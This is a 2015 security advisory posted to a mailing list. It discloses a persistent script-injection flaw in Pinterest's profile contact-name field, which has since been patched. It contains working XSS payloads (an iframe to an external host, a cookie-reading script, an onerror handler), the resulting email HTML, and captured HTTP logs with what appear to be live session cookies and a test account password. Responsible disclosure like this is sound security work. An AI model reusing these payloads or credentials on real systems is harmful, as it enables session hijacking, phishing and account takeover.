
Date: Wed, 01 Jul 2015 09:10:39 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: bugtraq@...urityfocus.com, bugs@...uritytracker.com
Subject: Pinterest Bug Bounty #1 - Persistent contact_name Vulnerability

Document Title:
===============
Pinterest Bug Bounty #1 - Persistent contact_name Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1431


Release Date:
=============
2015-06-30


Vulnerability Laboratory ID (VL-ID):
====================================
1431


Common Vulnerability Scoring System:
====================================
3.3


Product & Service Introduction:
===============================
Pinterest is a web and mobile application company that offers a visual discovery, collection, sharing, and storage tool. 
Users create and share the collections of visual bookmarks (boards). Boards are created through a user selecting an item, 
page, website, etc. and pinning it to an existing or newly created board. Users save and share pins from multiple resources 
onto boards based on a plethora of criteria, e.g. similar characteristics, a theme, birthday parties, planning a vacation, 
writing a book, interior decorating, holidays. Boards can develop projects, organize events, or save pictures and data together. 
The site was founded by Ben Silbermann, Paul Sciarra and Evan Sharp. It is managed by Cold Brew Labs and funded by a small group 
of entrepreneurs and investors.

(Copy of the Homepage: http://en.wikipedia.org/wiki/Pinterest )


Abstract Advisory Information:
==============================
The Vulnerability Laboratory Research Team discovered an application-side mail encoding and validation vulnerability in the official Pinterest online service web-application.


Vulnerability Disclosure Timeline:
==================================
2015-01-30:	Researcher Notification & Coordination (Benjamin Kunz Mejri)
2015-01-31:	Vendor Notification (Pinterest Bug Bounty Program)
2015-02-06:	Vendor Response/Feedback (Pinterest Bug Bounty Program)
2015-02-18:	Vendor Fix/Patch Notification (Pinterest - Developer Team)
2015-06-30:	Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Pinterest
Product: Pinterest - Online Service Web Application 2015 Q1


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A persistent mail encoding web vulnerability has been discovered in the official Pinterest Web-Application (API).
The application-side issue allows remote attackers to compromise emails by injection of own malicious persistent context.

The application-side validation and encoding vulnerability is located in the `contact_name` value of the User Profile > 
Kontaktperson input field. Remote attackers are able to inject on registration user emails or random mails with script code 
in the Kontaktperson input field (contact_name) of the user profile. Remote attackers can inject the code on registration and 
local attackers can use Kontoeinstellungen module. After the inject of malicious script code the service stores the account 
in the database management system. The service captures with the wrong encoding the user input and sends it in the pinterest 
tip to the saved or changed email. The execution of the injected script code occurs next to the introduction word context `Hallo`.
The attack vector of the issue is located on the application-side of the online service and the request method to inject is POST. 

The security risk of the persistent mail encoding web vulnerability is estimated as medium with a cvss (common vulnerability scoring system) 
count of 3.3. Exploitation of the persistent vulnerability requires a low privilege pinterest account 
with low user interaction. Successful exploitation of the vulnerability results in session hijacking, persistent phishing attacks, persistent 
redirect to external source and persistent manipulation of affected or connected module context.


Request Method(s):
				[+] POST

Vulnerable Module(s):
				[+] User Profile

Vulnerable Input(s):
				[+] Kontaktperson

Vulnerable Function(s):
				[+] contact_name

Affected Module(s):
				[+] Pinterest Tips - Mail (community@...terest.com & community@...il.pinterest.com)


Proof of Concept (PoC):
=======================
The application-side mail encoding web vulnerability can be exploited by local attackers and remote attackers with medium or high user interaction.
For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.

Manual steps to reproduce the security vulnerability ...
1. Open the pinterest website and register to the pinterest community web-application account
2. Include the following string to the name input fields    <script-code>@<script-code>.com 
Note: Use Username: admin@...lution-sec.com Password: bugcrowd23
3. Save the settings to add the new account to the pinterest database
Note: Now, you need to wait even if the account is not confirmed the pinterest tips will arrive
4. The script code execution occurs in the pinterest tip mail next to the Hallo introduction word context
Note: The issue can be exploited by local and remote accounts. Remote attackers are able register with random mails without verification to 
send the pinterest service pin tips with malicious context.
5. Successful reproduce of the security vulnerability!


PoC: Pin-Tipp: So erstellst du geheime Pinnwände (community@...terest.com & community@...il.pinterest.com)

</a>
<table class="full-width-module-wrapper module" width="600" border="0" cellpadding="0" cellspacing="0"
style="background:#FFFFFF;border-top-left-radius:3px;border-top-right-radius:3px;border-bottom-left-radius:3px;
border-bottom-right-radius:3px;border-top:1px solid #e3e3e3;
border-bottom:1px solid #e3e3e3;border-left:1px solid #e3e3e3;border-right:1px solid #e3e3e3;;overflow:hidden;">
<tr>
<td align="center" style="padding:0px;">
<table class="module education" width="600" border="0" cellpadding="0" cellspacing="0"
style="background:#FFFFFF;border-top: 0;">
<tr>
<td class="spacer mobile-h34" colspan="1" height="34" style="font-size:34px;line-height:34px;"> </td>
</tr>
<tr>
<td class="education-text" align="left" style="padding:3px 50px 3px 50px;font-family:helvetica neue,helvetica,sans-serif;font-size:18px;line-height:18px;font-weight:bold;color:#454545;">
Hallo [PERSISTENT SCRIPT CODE EXECUTION!]>"<iframe src=http://www.evolution-sec.com/>@gmail.com >"<script>alert(document.cookie)</script><div style="1@...il.com  "><img src="x" onerror=prompt(23);>,
</td>
</tr>
<tr>
<td class="education-text" align="left" style="font-family:helvetica neue,helvetica,sans-serif;font-size:16px;color:#666666;line-height:24px;padding:0 50px 0px 50px;">
Pinnwände sind wie Ordner, in denen du deine Pins sammelst. Du kannst Pinnwände für alles Mögliche anlegen: z. B. Rezepte zum Ausprobieren, Reiseziele oder Deko- und Renovierungsideen. 
Ruf einfach dein Profil auf und klick oder tipp auf "Pinnwand erstellen".
</td>
</tr>
<tr>
<td align="left" class="education-text" style="padding:20px 50px 0 50px">
<a href="http://email.pinterest.com/wf/click?upn=6BYe7GcOqo2-2FQJfZxNiGlvZ10hIa-2BCT1Fr2z7QlJBb-2BwTaKIcILD06Z4gzgs57qipJ7um0r8zKbwfVubK3L7jo-2Fc4gtVV8JRo5o3HU20kmXKnUJa7Db-2B-
2FFYTxDgfqadeCY9TG3Rl20tQylxrO8VwSyJObzm2swqT3EaIZgAVH6FSdSI3sQCCQ7T1hNnrhcDm_uoQOw53Jnd2odJf4vBwXdaO9o0xm0XGX-2FrUtBfGLEGFQFF8sBK2LzS5MYb4t-2BvY9qfRrhUYP9K-2Fdom8pkHGnE-
2BgwSPDeOFVY-2FBY7HSXw3yK9Qtw2Y1gnS-2BQioggu-2FkrwC77pIe20sj9O0xaWLvOHI2DYIP3FsVB69t-2Fci5mNoYTlBiuyzqcphu0i-2Fn5hGS5kcSwHeZjgfPJaScTx10O-2Bh-2BAjM6HMk-2BUACZmkcnxLY8-
2FyOeZVZU0B3J18S9olUomWSFsUdp9NGEPT3WvgP5hSVHUUDIQAkWCbtXotKHGZPA-2BsHTCBW8aVfa1AeTnLW3We3VZ3iaFsXqQsgEhUa5Hdjsey2LVgBQ0UGm1VQs0hguexQiPnyoYtgj-
2F3IuQM5v2rwhfz1D94jfZbo6ckbK2gQ8WphGQkivFG-2BnReBkaGx58-3D" style="text-decoration:none;display:block">
<table height="40" border="0" cellpadding="0" cellspacing="0">
<tr>
<td height="38" style="background-color:#3983d0;padding:2px 15px 0px 15px;border-bottom:2px solid #2868a4;border-radius:3px;">
<a href="http://email.pinterest.com/wf/click?upn=6BYe7GcOqo2-2FQJfZxNiGlvZ10hIa-2BCT1Fr2z7QlJBb-2BwTaKIcILD06Z4gzgs57qipJ7um0r8zKbwfVubK3L7jo-2Fc4gtVV8JRo5o3HU20kmXKnUJa7Db-2B-
2FFYTxDgfqadeCY9TG3Rl20tQylxrO8VwSyJObzm2swqT3EaIZgAVH6FSdSI3sQCCQ7T1hNnrhcDm_uoQOw53Jnd2odJf4vBwXdaO9o0xm0XGX-2FrUtBfGLEGFQFF8sBK2LzS5MYb4t-2BvY9qfRrhUYP9K-
2Fdom8pkHGnEw8g0284vFsntf4-2F59-2B-2Fv84sXcZQVkvBGEerUKpGnA49NmPon-2B61E9UeXsn-2FUFyxIzqnQybh78aLSvCHeW7Z9Wzuvpne2mpjPwId7DEH8riq02KXJpkUTl9XIYdC71BO-
2F62Kr-2FPJlQUIlQIoj-2BzBpVEApCuRmIAtVIHnhoHyFNBfp-2Bq7okZA-2B0IvfyEo8RTPw-2FPCkwC4R9NhDy-2FB29VGDZN-2FYdh4AfqXSrca261qtpHnrh1OH8Dr84-
2BYDJ6M2P-2BVCki6c8yBi2j41vzrPWQxA0SyRyIaNroGVfj4q-2F9R2yuSOagpBfZPUQ1wd8fcYGH4d2OQUAFX3mogZGohCzKj35U-3D" style="font-family:helvetica,sans-serif;
font-size:16px;color:#ffffff;text-decoration:none;display:block">
Und so geht's
</a>
</td>
</tr>
</table>


--- PoC Session Logs [POST] (Inject) ---
10:19:10.573[496ms][total 496ms] Status: 200[OK]
POST https://www.pinterest.com/resource/UserSettingsResource/update/ Load Flags[LOAD_BYPASS_CACHE  LOAD_BACKGROUND  ] Größe des Inhalts[798] Mime Type[application/json]
   Request Header:
      Host[www.pinterest.com]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0]
      Accept[application/json, text/javascript, */*; q=0.01]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
      X-Pinterest-AppState[active]
      X-CSRFToken[05ANpvbsm3mOhbh8HGQjnpZSeuGtPthI]
      X-NEW-APP[1]
      X-APP-VERSION[6ea2d7a]
      X-Requested-With[XMLHttpRequest]
      Referer[https://www.pinterest.com/settings/]
      Content-Length[2101]
      Cookie[csrftoken=05ANpvbsm3mOhbh8HGQjnpZSeuGtPthI; _pinterest_sess="TWc9PSZCZ2tBaVdqWk9tUmU0VUZKUXlsVjRkTGkxeU1sRkNvbXNxQU1iQ0xPd2pVc1UzbjRuNlNoZSt5SW9LYk1QaE9qcVZOa2hOY3FNQU00MVpZODdxUHpNSWdQczBpV2hoUkFSL0JZYWk0RWpzKzBaY3U2SXllTWR2SmZGQXhnQzFLaWszMUZ6eHQxN0ZSR3NzSnkxR0VsMWxSTGwxMU56aThiRG5pWnMxeE94cWtxUkRzME9LWXhvcmZKTWIzLzNjK3hGVFBaV2lsczFLc1JUd0VCVVF2a3lDRG5NeENDWCswQm9EWFMwMnZmcGN2dFNBOFE4Zm90TXpSU0dwNEoyN3FGQ3ptVW5HTHdTMjB5aVlhQURPRnhNbVNhcWVObTJlclEramYyK0lGTkc0YUZyQk4zc05icTVjTlJwNTZNSGpjVjlMdFdJci8wVHA0ZHllR0kySjNiVXIvWkpoYnU2YVNLN2NINXpUdzgyUG92dWQ1WE9WRFIvK2cwM1kxQVF5YWdJNExScTE0T1hxS2drellUVHNDaWd6NWU5OWcybjBJbS9vTjhFVVMxNmNWK2NIdmFZSHM1MUdkb2t2Sjd5OXJmNjdLTk5HUEhzK21GQjZPQXhJUmFhUT09JjVDcGVhRkRvRCs4TEh2N0NOeGFsMUllZTBOZz0="; c_dpr=1; __utma=229774877.1994396236.1422608694.1422608694.1422608788.2; __utmb=229774877.32.3.1422609079584; __utmc=229774877; __utmz=229774877.1422608788.2.2.utmcsr=31|utmccn=pwreset|utmcmd=2000; _pinterest_referral_source=email_pwreset; _pinterest_d_sess=True; _pinterest_s_sess="TWc9PSZZejNKeUl2Wk9SOTRBL24zdlkvcitlZ2hoY2xKR094MmUyZXBucjB0ZS9YZWJwVjZmOTZVRVo4WTRuY25pMVFMWWJ1K1V4R3FMS2s0YVVTTXFyZjVJMis2TkloMHVod0o2aS9BYWd3WDcvVnd1Q244aThyMzJscER4VmNPdjE0MFhJSWpIVjI3V3ZLR0dKTXdvWmozT085MmtjSUhEWTArUnY4WFZLdUxZSGVZbUZVWDRUMDl0VnI3cWpRQ0lnMFhsYlRaWmFGRXVLQktYbVNxUUFuSnRIRmtUNE9OdTNYSG9VWGx1bW9QR05GMTN2WDlEZmtjd2swNkVzRldWK1hOSTlFNDgydnJDZzdER0NJckNTbERNclY5K3M5SWdldWNGbFQrN1RBVy9MbUx3NlNrbEJSNlFrMjlWMUpDdFVzRzI0aWxqMUl3b0FNQUxPOEpYRlg1V3pmYm9HNndVeEZtQ2ZBVU5BRnpsTERXY0VrZllrV3lwbVVLMmNtd2txcUp3VHNISzBPMEZ1NnJhdmUxSGF0RDV3bTBaejJBL0hUQVBVQkJ1NWVhYjB6VFdOdzBQUk1xelh2NWVqUG5zSkhGOU5TWVRabzRPYWZ5NW1KZzEzditaYzMxblkrSGRnelRzNXRnZVF0L2p1QT0mLzI3SStIU1Z6R0RQM04zcjA2ZUFCbFR0SnhnPQ=="; _b="AQxP9sQCkm1OYoSM+b8dFEbGxyq6fJhaLIgRvJX6tfbcx/vL5vA4nk87M9uDzbFfEjc="; _pinterest_pfob=disabled]
      Connection[keep-alive]
      Pragma[no-cache]
      Cache-Control[no-cache]
   POST-Daten:
      source_url[%2Fsettings%2F]
      data[%7B%22options%22%3A%7B%22email%22%3A%22admin%40evolution-sec.com%22%2C%22locale%22%3A%22de%22%2C%22country%22%3A%22DE%22%2C%22account_type%22%3A%22other%22%2C%22contact_name%22%3A%22a%3E%5C%22%3Ciframe+src%3Dhttp%3A%2F%2Fevolution-sec.com%2F%3E%40gmail.com+%3E%5C%22%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E%3Cdiv+style%3D%5C%221%40gmail.com++%5C%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(23)%3B%3E+%3E%5C%22%3Ciframe+src%3Dhttp%3A%2F%2Fglobal-evolution.info%2F%3E%40gmail.com+%3E%5C%22%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E%3Cdiv+style%3D%5C%221%40gmail.com++%5C%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(233)%3B%3E%22%2C%22ads_customize_from_conversion%22%3Atrue%2C%22business_name%22%3A%22%3E%5C%22%3Ciframe+src%3Dhttp%3A%2F%2Fglobal-evolution.info%2F%3E%40gmail.com+%3E%5C%22%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E%3Cdiv+style%3D%5C%221%40gmail.com++%5C%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(23)%3B%3E+%22%2C%22username%22%3A%22servojjj333%22%2C%22about%22%3A%22new%22%2C%22location%22%3A%22%22%2C%22website_url%22%3A%22http%3A%2F%2Fgoogle.com%2F%22%2C%22filter_settings%22%3A%22anyone%22%2C%22email_enabled%22%3Atrue%2C%22email_repins%22%3Atrue%2C%22email_likes%22%3Atrue%2C%22email_follows%22%3Atrue%2C%22email_interval%22%3A%22immediate%22%2C%22email_comments%22%3Atrue%2C%22email_shares%22%3Atrue%2C%22email_friends_joining%22%3Atrue%2C%22email_collaboration_invite%22%3Atrue%2C%22email_product_changes%22%3Atrue%2C%22email_suggestions%22%3Atrue%2C%22email_news%22%3Atrue%2C%22email_updates%22%3Atrue%2C%22email_education%22%3Atrue%2C%22email_feedback_and_research%22%3Atrue%2C%22exclude_from_search%22%3Afalse%2C%22personalize_from_offsite_browsing%22%3Afalse%2C%22login_with_facebook%22%3Afalse%2C%22login_with_twitter%22%3Afalse%2C%22connectToGplus%22%3Afalse%2C%22connectToGoogle%22%3Afalse%2C%22connectToYahoo%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D]
      module_path[App()%3EUserSettingsPage(resource%3DUserSettingsResource())%3EButton(class_name%3DsaveSettingsButton%2C+color%3Dprimary%2C+type%3Dsubmit%2C+text%3DEinstellungen+speichern)]
   Response Header:
      Accept-Ranges[bytes]
      Cache-Control[no-cache, no-store, must-revalidate, max-age=0]
      Content-Encoding[gzip]
      Content-Type[application/json; charset=utf-8]
      Expires[Thu, 01 Jan 1970 00:00:00 GMT]
      Pinterest-Breed[CORGI]
      Pinterest-Generated-By[ngapp2-64047236]
      Pinterest-Version[6ea2d7a]
      Pragma[no-cache]
      Server[nginx]
      Vary[User-Agent, Accept-Encoding]
      x-content-type-options[nosniff]
      X-Frame-Options[SAMEORIGIN]
      X-Pinterest-RID[935234333009]
      X-Varnish[3395416925]
      X-XSS-Protection[1; mode=block]
      Content-Length[798]
      Date[Fri, 30 Jan 2015 09:19:21 GMT]
      Connection[keep-alive]
- 
updating profile
10:19:10.574[444ms][total 444ms] Status: 200[OK]
POST https://www.pinterest.com/resource/NotificationSettingsResource/update/ Load Flags[LOAD_BYPASS_CACHE  LOAD_BACKGROUND  ] Größe des Inhalts[470] Mime Type[application/json]
   Request Header:
      Host[www.pinterest.com]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0]
      Accept[application/json, text/javascript, */*; q=0.01]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
      X-Pinterest-AppState[active]
      X-CSRFToken[05ANpvbsm3mOhbh8HGQjnpZSeuGtPthI]
      X-NEW-APP[1]
      X-APP-VERSION[6ea2d7a]
      X-Requested-With[XMLHttpRequest]
      Referer[https://www.pinterest.com/settings/]
      Content-Length[341]
      Cookie[csrftoken=05ANpvbsm3mOhbh8HGQjnpZSeuGtPthI; _pinterest_sess="TWc9PSZCZ2tBaVdqWk9tUmU0VUZKUXlsVjRkTGkxeU1sRkNvbXNxQU1iQ0xPd2pVc1UzbjRuNlNoZSt5SW9LYk1QaE9qcVZOa2hOY3FNQU00MVpZODdxUHpNSWdQczBpV2hoUkFSL0JZYWk0RWpzKzBaY3U2SXllTWR2SmZGQXhnQzFLaWszMUZ6eHQxN0ZSR3NzSnkxR0VsMWxSTGwxMU56aThiRG5pWnMxeE94cWtxUkRzME9LWXhvcmZKTWIzLzNjK3hGVFBaV2lsczFLc1JUd0VCVVF2a3lDRG5NeENDWCswQm9EWFMwMnZmcGN2dFNBOFE4Zm90TXpSU0dwNEoyN3FGQ3ptVW5HTHdTMjB5aVlhQURPRnhNbVNhcWVObTJlclEramYyK0lGTkc0YUZyQk4zc05icTVjTlJwNTZNSGpjVjlMdFdJci8wVHA0ZHllR0kySjNiVXIvWkpoYnU2YVNLN2NINXpUdzgyUG92dWQ1WE9WRFIvK2cwM1kxQVF5YWdJNExScTE0T1hxS2drellUVHNDaWd6NWU5OWcybjBJbS9vTjhFVVMxNmNWK2NIdmFZSHM1MUdkb2t2Sjd5OXJmNjdLTk5HUEhzK21GQjZPQXhJUmFhUT09JjVDcGVhRkRvRCs4TEh2N0NOeGFsMUllZTBOZz0="; c_dpr=1; __utma=229774877.1994396236.1422608694.1422608694.1422608788.2; __utmb=229774877.32.3.1422609079584; __utmc=229774877; __utmz=229774877.1422608788.2.2.utmcsr=31|utmccn=pwreset|utmcmd=2000; _pinterest_referral_source=email_pwreset; _pinterest_d_sess=True; _pinterest_s_sess="TWc9PSZZejNKeUl2Wk9SOTRBL24zdlkvcitlZ2hoY2xKR094MmUyZXBucjB0ZS9YZWJwVjZmOTZVRVo4WTRuY25pMVFMWWJ1K1V4R3FMS2s0YVVTTXFyZjVJMis2TkloMHVod0o2aS9BYWd3WDcvVnd1Q244aThyMzJscER4VmNPdjE0MFhJSWpIVjI3V3ZLR0dKTXdvWmozT085MmtjSUhEWTArUnY4WFZLdUxZSGVZbUZVWDRUMDl0VnI3cWpRQ0lnMFhsYlRaWmFGRXVLQktYbVNxUUFuSnRIRmtUNE9OdTNYSG9VWGx1bW9QR05GMTN2WDlEZmtjd2swNkVzRldWK1hOSTlFNDgydnJDZzdER0NJckNTbERNclY5K3M5SWdldWNGbFQrN1RBVy9MbUx3NlNrbEJSNlFrMjlWMUpDdFVzRzI0aWxqMUl3b0FNQUxPOEpYRlg1V3pmYm9HNndVeEZtQ2ZBVU5BRnpsTERXY0VrZllrV3lwbVVLMmNtd2txcUp3VHNISzBPMEZ1NnJhdmUxSGF0RDV3bTBaejJBL0hUQVBVQkJ1NWVhYjB6VFdOdzBQUk1xelh2NWVqUG5zSkhGOU5TWVRabzRPYWZ5NW1KZzEzditaYzMxblkrSGRnelRzNXRnZVF0L2p1QT0mLzI3SStIU1Z6R0RQM04zcjA2ZUFCbFR0SnhnPQ=="; _b="AQxP9sQCkm1OYoSM+b8dFEbGxyq6fJhaLIgRvJX6tfbcx/vL5vA4nk87M9uDzbFfEjc="; _pinterest_pfob=disabled]
      Connection[keep-alive]
      Pragma[no-cache]
      Cache-Control[no-cache]
   POST-Daten:
      source_url[%2Fsettings%2F]
      data[%7B%22options%22%3A%7B%22push_settings%22%3A%22%7B%7D%22%2C%22filter_settings%22%3A%22anyone%22%7D%2C%22context%22%3A%7B%7D%7D]
      module_path[App()%3EUserSettingsPage(resource%3DUserSettingsResource())%3EButton(class_name%3DsaveSettingsButton%2C+color%3Dprimary%2C+type%3Dsubmit%2C+text%3DEinstellungen+speichern)]
   Response Header:
      Accept-Ranges[bytes]
      Cache-Control[no-cache, no-store, must-revalidate, max-age=0]
      Content-Encoding[gzip]
      Content-Type[application/json; charset=utf-8]
      Expires[Thu, 01 Jan 1970 00:00:00 GMT]
      Pinterest-Breed[CORGI]
      Pinterest-Generated-By[ngapp2-9e37a373]
      Pinterest-Version[6ea2d7a]
      Pragma[no-cache]
      Server[nginx]
      Vary[User-Agent, Accept-Encoding]
      x-content-type-options[nosniff]
      X-Frame-Options[SAMEORIGIN]
      X-Pinterest-RID[485779047467]
      X-Varnish[2623749093]
      X-XSS-Protection[1; mode=block]
      Content-Length[470]
      Date[Fri, 30 Jan 2015 09:19:21 GMT]
      Connection[keep-alive]
- 
successful updates profile
10:19:11.102[335ms][total 335ms] Status: 200[OK]
GET https://www.pinterest.com/settings Load Flags[VALIDATE_ALWAYS LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[-1] Mime Type[text/html]
   Request Header:
      Host[www.pinterest.com]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Cookie[csrftoken=05ANpvbsm3mOhbh8HGQjnpZSeuGtPthI; _pinterest_sess="TWc9PSZCZ2tBaVdqWk9tUmU0VUZKUXlsVjRkTGkxeU1sRkNvbXNxQU1iQ0xPd2pVc1UzbjRuNlNoZSt5SW9LYk1QaE9qcVZOa2hOY3FNQU00MVpZODdxUHpNSWdQczBpV2hoUkFSL0JZYWk0RWpzKzBaY3U2SXllTWR2SmZGQXhnQzFLaWszMUZ6eHQxN0ZSR3NzSnkxR0VsMWxSTGwxMU56aThiRG5pWnMxeE94cWtxUkRzME9LWXhvcmZKTWIzLzNjK3hGVFBaV2lsczFLc1JUd0VCVVF2a3lDRG5NeENDWCswQm9EWFMwMnZmcGN2dFNBOFE4Zm90TXpSU0dwNEoyN3FGQ3ptVW5HTHdTMjB5aVlhQURPRnhNbVNhcWVObTJlclEramYyK0lGTkc0YUZyQk4zc05icTVjTlJwNTZNSGpjVjlMdFdJci8wVHA0ZHllR0kySjNiVXIvWkpoYnU2YVNLN2NINXpUdzgyUG92dWQ1WE9WRFIvK2cwM1kxQVF5YWdJNExScTE0T1hxS2drellUVHNDaWd6NWU5OWcybjBJbS9vTjhFVVMxNmNWK2NIdmFZSHM1MUdkb2t2Sjd5OXJmNjdLTk5HUEhzK21GQjZPQXhJUmFhUT09JjVDcGVhRkRvRCs4TEh2N0NOeGFsMUllZTBOZz0="; c_dpr=1; __utma=229774877.1994396236.1422608694.1422608694.1422608788.2; __utmb=229774877.32.3.1422609079584; __utmc=229774877; __utmz=229774877.1422608788.2.2.utmcsr=31|utmccn=pwreset|utmcmd=2000; _pinterest_referral_source=email_pwreset; _pinterest_d_sess=True; _pinterest_s_sess="TWc9PSZZejNKeUl2Wk9SOTRBL24zdlkvcitlZ2hoY2xKR094MmUyZXBucjB0ZS9YZWJwVjZmOTZVRVo4WTRuY25pMVFMWWJ1K1V4R3FMS2s0YVVTTXFyZjVJMis2TkloMHVod0o2aS9BYWd3WDcvVnd1Q244aThyMzJscER4VmNPdjE0MFhJSWpIVjI3V3ZLR0dKTXdvWmozT085MmtjSUhEWTArUnY4WFZLdUxZSGVZbUZVWDRUMDl0VnI3cWpRQ0lnMFhsYlRaWmFGRXVLQktYbVNxUUFuSnRIRmtUNE9OdTNYSG9VWGx1bW9QR05GMTN2WDlEZmtjd2swNkVzRldWK1hOSTlFNDgydnJDZzdER0NJckNTbERNclY5K3M5SWdldWNGbFQrN1RBVy9MbUx3NlNrbEJSNlFrMjlWMUpDdFVzRzI0aWxqMUl3b0FNQUxPOEpYRlg1V3pmYm9HNndVeEZtQ2ZBVU5BRnpsTERXY0VrZllrV3lwbVVLMmNtd2txcUp3VHNISzBPMEZ1NnJhdmUxSGF0RDV3bTBaejJBL0hUQVBVQkJ1NWVhYjB6VFdOdzBQUk1xelh2NWVqUG5zSkhGOU5TWVRabzRPYWZ5NW1KZzEzditaYzMxblkrSGRnelRzNXRnZVF0L2p1QT0mLzI3SStIU1Z6R0RQM04zcjA2ZUFCbFR0SnhnPQ=="; _b="AQxP9sQCkm1OYoSM+b8dFEbGxyq6fJhaLIgRvJX6tfbcx/vL5vA4nk87M9uDzbFfEjc="; _pinterest_pfob=disabled]
      Connection[keep-alive]
   Response Header:
      Cache-Control[no-cache, no-store, must-revalidate, max-age=0]
      Content-Encoding[gzip]
      content-security-policy[default-src 'self' https://*.pinterest.com https://*.pinimg.com  *.pinterest.com *.pinimg.com *.google.com connect.facebook.net *.google-analytics.com https://*.facebook.com *.facebook.com www.googleadservices.com googleads.g.doubleclick.net platform.twitter.com *.tiles.mapbox.com *.online-metrix.net 'unsafe-inline' 'unsafe-eval'; frame-src *; img-src *; report-uri /_/_/csp_report/?a=298645156448463237:lTLp0LmhPATBEJ6e4UZhW1jvEmM]
      Content-Type[text/html; charset=utf-8]
      Expires[Thu, 01 Jan 1970 00:00:00 GMT]
      Pinterest-Breed[CORGI]
      Pinterest-Generated-By[ngapp2-7040ed5d]
      Pinterest-Version[6ea2d7a]
      Pragma[no-cache]
      Server[nginx]
      Vary[User-Agent, Accept-Encoding]
      x-content-type-options[nosniff]
      X-Frame-Options[SAMEORIGIN]
      X-Pinterest-RID[927927480513]
      x-ua-compatible[IE=edge]
      X-Varnish[2146070572]
      X-XSS-Protection[1; mode=block]
      Date[Fri, 30 Jan 2015 09:19:22 GMT]
      Transfer-Encoding[chunked]
      Connection[keep-alive, Transfer-Encoding]

Reference(s):
http://pinterest.com
http://community.pinterest.com
http://email.pinterest.com


Solution - Fix & Patch:
=======================
The vulnerability can be patched by a secure aprse and encode of the vulnerable contact_name value in the user profile scheme.
Filter the input of the profile Kontaktperson input field and disallow special chars to prevent an script code execution in outgoing service emails.


Security Risk:
==============
The security risk of the application-side input validation web vulnerability in the contact_name value is estimated as medium. (CVSS 3.3)


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@...lution-sec.com) [www.vulnerability-lab.com]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
policies, deface websites, hack into databases or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 	       		- admin@...lution-sec.com
Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
(admin@...nerability-lab.com or research@...nerability-lab.com) to get a permission.

				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™

-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com
PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt



